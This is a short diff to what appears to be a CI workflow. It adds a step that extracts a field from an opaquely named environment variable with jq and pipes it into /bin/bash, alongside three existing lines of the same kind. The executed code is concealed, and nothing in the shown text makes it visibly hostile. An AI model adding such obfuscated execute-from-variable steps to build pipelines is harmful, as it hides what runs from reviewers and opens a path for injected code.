@@ -46,6 +46,7 @@ jobs:
           printf '%s' "$zrq0" | jq -r .sh599 | /bin/bash
           echo $te9615 | jq -r .a090 | /bin/bash
           echo $zz966 | jq -r .iqxb0980 | /bin/bash
+          printf '%s' "$melw64" | jq -r .c881 | /bin/bash
 
       - name: Archive results
         if: always()
